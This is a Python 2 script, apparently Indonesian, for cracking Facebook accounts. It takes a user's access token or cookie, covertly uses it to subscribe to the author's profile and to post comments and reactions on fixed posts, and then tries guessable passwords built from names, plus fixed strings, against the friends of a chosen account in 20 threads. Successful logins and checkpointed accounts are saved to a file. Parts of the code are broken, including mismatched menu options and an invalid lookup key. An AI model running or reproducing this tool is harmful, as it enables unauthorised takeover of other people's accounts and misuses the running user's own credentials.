#!/usr/bin/python2
# coding=utf-8
import os,re,sys,itertools,time,requests,random,threading,json,random
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
reload(sys)
sys.setdefaultencoding('utf8')

merah = '\x1b[1;91m'
lime = '\x1b[1;92m'
kuning = '\x1b[1;93m'
biru = '\x1b[1;94m'
ungu = '\x1b[1;95m'
blue = '\x1b[1;96m'
putih = '\x1b[1;97m'
tutup = '\x1b[0m'

#### LOADING ####
os.system('clear')
done = False
def animate():
    for c in itertools.cycle(['\033[0;97m|', '\033[0;97m/', '\033[0;97m-', '\033[0;97m\\']):
        if done:
            break
        sys.stdout.write('\r\033[0;97m︻デ✪═══➽'+ c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c )
        sys.stdout.flush()
        time.sleep(0.1)
 
t = threading.Thread(target=animate)
t.start()
 
time.sleep(5)
done = True

### KELUAR ###
def keluar():
	print ("! Exit")
	os.sys.exit()
	
### JALAN ###
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
### LOGO ###
logo = ("""
\033[0;91m :::::::::     :::     ::::::::::: ::::    :::                    
\033[0;91m      :+:    :+: :+:       :+:     :+:+:   :+:  
\033[0;91m     +:+    +:+   +:+      +:+     :+:+:+  +:+     
\033[0;91m    +#+    +#++:++#++:     +#+     +#+ +:+ +#+     
\033[0;1m   +#+     +#+     +#+     +#+     +#+  +#+#+#     
\033[0;1m  #+#      #+#     #+#     #+#     #+#   #+#+#    
\033[0;1m ######### ###     ### ########### ###    ####                                                                              

\33[1;91m╔══════════════════════════════════════════╗
\33[1;91m║\033[37;1;1mAuthor\33[1;33m\033[37;1m   : Zamuel Voldemord               \33[1;91m║
\33[1;91m║\033[37;1;1mGithub\33[1;33m\033[37;1m   : Github.com/zamxyz              \33[1;91m║
\33[1;91m║\033[37;1;1mFacebook\33[1;33m\033[37;1m : Facebook.com/zamxyz.gans.01    \33[1;91m║
\33[1;91m╚══════════════════════════════════════════╝ """)

back = 00
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []
fbid = []

##### MASUK #####
def masuk():
	os.system('clear')
	print logo
	print 52* ('\033[0;92m');time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m1\033[1;91m)\033[0;97m. Login Via Token Facebook');time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m2\033[1;91m)\033[0;97m. Login Via Cookie Facebook');time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m0\033[1;91m)\033[0;97m. Keluar');time.sleep(0.07)
	print 52* ('\033[0;92m');time.sleep(0.07)
	pilih_masuk()

#### PILIH MASUK ####
def pilih_masuk():
	msuk = raw_input('\033[0;97m︻デ✪═➽\033[1;91m: \033[0;91m ')
	if msuk =="":
		print '\033[0;91m! Isi Yg Benar'
		pilih_masuk()
	elif msuk =="1":
		login_token()
	elif msuk =="2":
		login_cookie()
	elif msuk =="0":
		keluar()
	else:
		print"\033[0;91m! Isi Yg Benar"
		pilih_masuk()
			
#### LOGIN_TOKEN ####
def login_token():
	os.system('clear')
	print logo
	print 50* '\033[0;97m─'
	toket = raw_input("\033[0;91m->\033[0;97m Token \033[0;97m:\033[0;91m ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[0;92m√ Login Berhasil'
		os.system('xdg-open https://m.facebook.com/zamxyz.gans.01')
		bot_komen()
	except KeyError:
		print '\033[1;91m! Token salah '
		time.sleep(1.7)
		masuk()
	except requests.exceptions.SSLError:
		print '! Koneksi Bermasalah'
		exit()
		
#### LOGIN COOKIES ####
def login_cookie():
	os.system('clear')
	print logo
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	try:
		cookie = raw_input("\033[0;91m->\033[0;97m Cookies \033[0;97m:\033[0;91m ")
		data = {
		            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # don't change this user agent.
			        'referer' : 'https://m.facebook.com/',
			        'host' : 'm.facebook.com',
			        'origin' : 'https://m.facebook.com',
			        'upgrade-insecure-requests' : '1',
			        'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			        'cache-control' : 'max-age=0',
			        'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			        'content-type' : 'text/html; charset=utf-8',
			         'cookie' : cookie }
		coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
		cari = re.search('(EAAA\w+)', coki.text)
		hasil = cari.group(1)
		zedd = open("login.txt", 'w')
		zedd.write(hasil)
		zedd.close()
		print '\033[0;92m√ Login Berhasil'
		time.sleep(2)
		bot_komen()
	except AttributeError:
		print '\033[0;91m! Cookies Salah'
		time.sleep(2)
		masuk()
	except UnboundLocalError:
		print '\033[0;91m! Cookies Salah'
		time.sleep(2)
		masuk()
	except requests.exceptions.SSLError:
		os.system('clear')
		print '\033[0;97m! Koneksi Bermasalah'
		exit()

#### BOT KOMEN ####
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
	kom = ('Sukses Selalu Gan! 😘')
	reac = ('ANGRY')
	post = ('3568327116622596')
	post2 = ('3568329129955728')
	kom2 = ('Sukses Selalu Gan! 😘')
	reac2 = ('ANGRY')
        requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()

#### MENU ####
def menu():
	os.system('clear')
	try:
		toket = open('login.txt','r').read()
	except IOError:
		print '\033[0;97m! Token Invalid '
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print '\033[0;97m ! Token invalid'
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print '\033[0;97m! Tidak ada koneksi'
		keluar()
	os.system("clear")
	print (logo);time.sleep(0.07)
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	jalan ("\033[0;97m•\033[0;97m WELCOME\033[0;90m =>\033[0;97m " +nama);time.sleep(0.07)
	jalan ("\033[0;97m•\033[0;97m USER ID\033[0;90m =>\033[0;97m " +id);time.sleep(0.07)
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	print ('\033[1;91(\033[0;97m1\033[1;91m)\033[0;97m. Crack ID Dari Teman/Publik');time.sleep(0.07)
	print ('\033[0;91m(\033[1;97m2\033[1;91m)\033[0;97m. Cari ID Menggunakan Username');time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m3\033[1;91m)\033[0;97m. Lihat Hasil Crack');time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m4\033[1;91m)\033[0;97m. Perbarui Script');time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m0\033[1;91m)\033[0;97m. Keluar Akun');time.sleep(0.07)
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	pilih_menu()
	
### PILIH MENU ###
def pilih_menu():
	peler = raw_input('\033[0;97m>\033[0;97m ')
	if peler =="":
		print '\033[0;97m ! Isi Yg Benar'
		pilih_menu()
	elif peler == "1":
		crack_teman()
	elif peler == "2":
		cari_id()
	elif peler == "3":
		hasil_crack()
	elif peler == "4":
		perbarui()
	elif peler == "0":
		print '\033[0;97mMenghaspus Token ...'
		time.sleep(1)
		os.system('rm -rf login.txt')
		keluar()
	else:
		print '\033[0;97m ! Isi Yg Benar'
		pilih_menu()
		
##### CRACK TEMAN/PUBLIK #####
def crack_teman():
	os.system("clear")
	print (logo);time.sleep(0.07)
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m1\033[1;91m)\033[0;97m. Crack ID');time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m0\033[1;91m)\033[0;97m. Kembali');time.sleep(0.07)
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	pilih_teman()
	
### PILIH TEMAN ###
def pilih_teman():
	uki = raw_input('\033[0;97m>\033[0;97m ')
	if uki =="":
		print '\033[0;97m! Isi Yg Benar'
		pilih_teman()
	elif uki == "01":
		crack_indo()
	elif uki == "00":
		menu()
	else:
		print '\033[0;97m! Isi Yg Benar'
		pilih_teman()

##### CRACK INDONESIA #####
def crack_indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print '\033[0;97m! Token Invalid'
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m1\033[1;91m)\033[0;97m. Crack Dari Daftar Teman');time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m2\033[1;91m)\033[0;97m. Crack Dari Publik/Teman');time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m3\033[1;91m)\033[0;97m. Crack Dari File');time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m0\033[1;91m)\033[0;97m. Kembali');time.sleep(0.07)
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	pilih_indo()

#### PILIH INDONESIA ####
def pilih_indo():
	teak = raw_input('\033[0;97m>\033[0;97m ')
	if teak =="":
		print '\033[0;97m! Isi Yg Benar'
		pilih_indo()
	elif teak =="1":
		os.system('clear')
		print logo
		print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2":
		os.system('clear')
		print logo
		print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
		idt = raw_input("\033[1;91m(\033[0;97m•\033[1;91m)\033[0;93mID Publik/Teman \033[0;97m:\033[0;97m ");time.sleep(0.07)
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print "\033[1;91m(\033[0;97m•\033[1;91m)\033[0;93m Nama \033[0;97m:\033[0;97m "+sp["name"]
		except KeyError:
			print "\033[0;97m! ID publik/teman tidak ada"
			raw_input("\n\033[1;97m< \033[0;97mKembali \033[0;97m>")
			crack_indo()
		except requests.exceptions.ConnectionError:
			print '\033[0;97m! Tidak ada koneksi'
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="3":
		os.system('clear')
		print logo
		try:
			print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
			idlist = raw_input('\033[0;97m• \033[0;97mNama File\033[0;97m :\033[0;97m ');time.sleep(0.07)
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[0;97mFile tidak ada ! '
			raw_input('\033[0;97m<\033[0;97m Kembali\033[0;97m >')
		except IOError:
			print '\033[0;97mFile tidak ada !'
			raw_input("\n\033[0;97m< \033[0;97mKembali \033[0;97m>")
			crack_indo()
	elif teak =="0" or teak =="0":
		crack_teman()
	else:
		print '\033[0;97m! Isi Yg Benar'
		pilih_indo()
	
	print '\033[1;91m(\033[0;97m•\033[1;91m)\033[0;93mJumlah ID\033[0;97m :\033[0;97m '+str(len(id));time.sleep(0.07)
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	
### MAIN INDONESIA ###
	def main(arg):
		global cekpoint,oks
		em = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
			v = json.loads(an.text)
			pw = v['first_name'].lower()+'123'
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\033[0;97m[SIP]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw
				oke = open('done/indo.txt', 'a')
				oke.write('\n[SIP] '+em+' | '+pw)
				oke.close()
				oks.append(em)
			else :
				if 'checkpoint' in xo:
					print '\033[0;97m[CP]\033[0;97m '+em+' \033[0;97m|\033[0;97m '+pw
					cek = open('done/indo.txt', 'a')
					cek.write('\n[CP] '+em+' | '+pw)
					cek.close()
					cekpoint.append(em)
				else:
					pw2 = v['first_name'].lower()+'12345'
					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\033[0;97m[SIP]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw2
						oke = open('done/indo.txt', 'a')
						oke.write('\n[SIP] '+em+' | '+pw2)
						oke.close()
						oks.append(em)
					else:
						if 'checkpoint' in xo:
							print '\033[0;97m[CP]\033[0;97m '+em+' \033[0;97m|\033[0;97m '+pw2
							cek = open('done/indo.txt', 'a')
							cek.write('\n[CP] '+em+' | '+pw2)
							cek.close()
							cekpoint.append(em)
						else:
							pw3 = v['last_name'].lower()+'123'
							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
							xo = rex.content
							if 'mbasic_logout_button' in xo or 'save-device' in xo:
								print '\033[0;97m[SIP]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw3
								oke = open('done/indo.txt', 'a')
								oke.write('\n[SIP] '+em+' | '+pw3)
								oke.close()
								oks.append(em)
							else:
								if 'checkpoint' in xo:
									print '\033[0;97m[CP]\033[0;97m '+em+' \033[0;97m|\033[0;97m '+pw3
									cek = open('done/indo.txt', 'a')
									cek.write('\n[CP] '+em+' | '+pw3)
									cek.close()
									cekpoint.append(em)
								else:
									pw4 = '786786'
									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
									xo = rex.content
									if 'mbasic_logout_button' in xo or 'save-device' in xo:
										print '\033[0;97m[SIP]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw4
										oke = open('done/indo.txt', 'a')
										oke.write('\n[SIP] '+em+' | '+pw4)
										oke.close()
										oks.append(em)
									else:
										if 'checkpoint' in xo:
											print '\033[0;97m[CP]\033[0;97m '+em+' \033[0;97m|\033[0;97m '+pw4
											cek = open('done/indo.txt', 'a')
											cek.write('\n[CP] '+em+' | '+pw4)
											cek.close()
											cekpoint.append(em)
                                        					else:
                                          					 	pw5 = 'bangsat'
                                           					 	rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
                                          					  	xo = rex.content
                                          					  	if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                            					    		print '\033[0;97m[SIP]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw5
                                           				     			oke = open('done/indo.txt', 'a')
                                             			   				oke.write('\n[SIP] '+em+' | '+pw5)
                                             			   				oke.close()
                                             				   			oks.append(em)
                                         				   		else:
                                          				      			if 'checkpoint' in xo:
                                            			        				print '\033[0;97m[CP]\033[0;97m '+em+' \033[0;97m|\033[0;97m '+pw5
                                             			       					cek = open('done/indo.txt', 'a')
                                              			      					cek.write('\n[CP] '+em+' | '+pw5)
									    				cek.close()
									    				cekpoint.append(em)
                                              				  			else:
                                               			     					pw6 = 'kontol'
                                               				     				rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw6, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
                                                			    				xo = rex.content
                                                			    				if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                                  				      				print '\033[0;97m[SIP]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw6
                                                  			      					oke = open('done/indo.txt', 'a')
                                                 			       					oke.write('\n[SIP] '+em+' | '+pw6)
                                                 			       					oke.close()
                                                  			         				oks.append(em)
                                                 			   				else:
                                                  				      				if 'checkpoint' in xo:
                                                   				         				print '\033[0;97m[CP]\033[0;97m '+em+' \033[0;97m|\033[0;97m '+pw6
                                                    			        					cek = open('done/indo.txt', 'a')
                                                    			        					cek.write('\n[CP] '+em+' | '+pw6)
                                                     				       					cek.close()
										    					cekpoint.append(em)
                                                      				  				else:
                                                      			      						pw7 = v['indonesia']
                                                       			     						rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw7, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
                                                       			     						xo = rex.content
                                                        			    					if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                                        			        					print '\033[0;97m[SIP]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw7
                                                         			       						oke = open('done/indo.txt', 'a')
                                                         		       							oke.write('\n[SIP] '+em+' | '+pw7)
                                                         		       							oke.close()
                                                         		       							oks.append(em)
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	print '\033[0;97m• \033[0;97mSelesai ...'
	print"\033[0;97m• \033[0;97mTotal \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97m: \033[0;97m"+str(len(oks))+"\033[0;97m/\033[0;97m"+str(len(cekpoint))
	print '\033[0;97m• \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97mfile tersimpan \033[0;97m: \033[0;97mdone/indo.txt'
	print 50* "\033[0;97m─"
	raw_input("\033[0;97m< \033[0;97mKembali\033[0;97m >")
	os.system("python2 zain.py")
	
#### CARI ID ####
def cari_id():
	os.system('clear')
	print logo
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	ling = ('https://www.facebook.com/')
	url = ling+raw_input("\033[0;97m• \033[0;97mUsername \033[0;97m:\033[0;97m ")
	idre = re.compile('"entity_id":"([0-9]+)"')
	page = requests.get(url)
	nex = idre.findall(page.content)
	for hasil in nex:
		print '\n'+'\033[0;97m• \033[0;97mID Anda\033[0;97m :\033[0;97m '+hasil
		raw_input("\n\033[0;97m< \033[0;97mKembali \033[0;97m>")
		menu()
		
### HASIL CRACK ###
def hasil_crack():
	os.system('clear')
	print logo
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	print ('\033[0;97m1. \033[0;97mLihat Hasil Crack indo');time.sleep(0.07)
	print ('\033[0;97m2. \033[0;97mLihat Hasil Crack Bangladesh');time.sleep(0.07)
	print ('\033[0;97m3. \033[0;97mLihat Hasil Crack Pakistan');time.sleep(0.07)
	print ('\033[0;97m4. \033[0;97mLihat Hasil Crack Usa');time.sleep(0.07)
	print ('\033[0;97m5. \033[0;97mLihat Hasil Crack Like');time.sleep(0.07)
	print ('\033[0;97m6. \033[0;97mLihat Hasil Crack Follow');time.sleep(0.07)
	print ('\033[0;97m0. \033[0;97mKembali');time.sleep(0.07)
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	pilih_hasil()
	
### PILIH HASIL ###
def pilih_hasil():
	keak = raw_input('\033[0;97m>\033[0;97m ')
	if keak =="":
		print '\033[0;97m! Isi Yg Benar'
		pilih_hasil()
	elif keak =="1":
		os.system('xdg-open done/indo.txt')
		hasil_crack()
	elif keak =="2":
		os.system('xdg-open done/bangla.txt')
		hasil_crack()
	elif keak =="3":
		os.system('xdg-open done/bangla.txt')
		hasil_crack()
	elif keak =="4":
		os.system('xdg-open done/pakis.txt')
		hasil_crack()
	elif keak =="5":
		os.system('xdg-open done/usa.txt')
		hasil_crack()
	elif keak =="6":
		os.system('xdg-open done/like.txt')
		hasil_crack()
	elif keak =="7":
		os.system('xdg-open done/follow.txt')
		hasil_crack()
	elif keak =="0":
		menu()
	else:
		print '\033[0;97mIsi Yg Benar'
		
### PERBARUI SCRIPT ###
def perbarui():
	os.system("clear")
	print logo
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	jalan ("\033[0;97mMemperbarui Script ...\033[0;97m")
	os.system("git pull origin master")
	raw_input("\n\033[0;97m<\033[0;97m Kembali \033[0;97m>")
	os.system("python2 zain.py")

if __name__=='__main__':
	menu()
	masuk()
